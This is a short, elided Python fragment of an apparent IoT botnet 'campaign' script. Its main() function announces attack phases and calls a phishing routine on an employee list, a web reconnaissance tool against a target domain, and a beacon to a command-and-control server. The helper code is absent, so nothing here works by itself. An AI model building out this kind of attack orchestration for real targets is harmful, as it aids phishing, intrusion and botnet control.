...
def main():
    """
    Main function to run the iot_botnet_campaign campaign.
    """
    print(f"[*] Starting iot_botnet_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("IoT_devices_employees.txt")
    run_tool("apt_web_recon.js", "--target IoT_devices.com")
    ...
    command_control.send_beacon(c2_server, "VICTIM-IOT_DEVICES-01")
